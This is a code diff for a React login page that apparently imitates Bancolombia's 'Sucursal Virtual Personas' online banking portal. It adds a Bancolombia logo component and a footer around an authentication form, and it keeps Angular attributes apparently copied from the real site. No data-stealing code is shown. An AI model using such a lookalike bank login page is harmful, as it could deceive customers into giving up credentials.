@@ -1,6 +1,7 @@
-import Logo from "./appPages/components/Logo";
+import AppLogoBancolombia from "./appPages/components/AppLogoBancolombia";
 import Banner from "./appPages/components/Banner";
 import AuthForm from "./appPages/components/AuthForm";
+import AppFooter from "./appPages/components/AppFooter";
 
 export default function Home() {
     return (
@@ -18,7 +19,7 @@ export default function Home() {
                                     className="bc-container-fluid trazo"
                                     style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}
                                 >
-                                    <Logo />
+                                    <AppLogoBancolombia />
 
                                     <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                                         Sucursal Virtual Personas
@@ -36,10 +37,9 @@ export default function Home() {
                     _ngcontent-ng-c54967524=""
                     _nghost-ng-c2515275900=""
                 >
-                            
+                </div>
 
-                        </div>
-
+                <AppFooter />
 
                     </div>
 
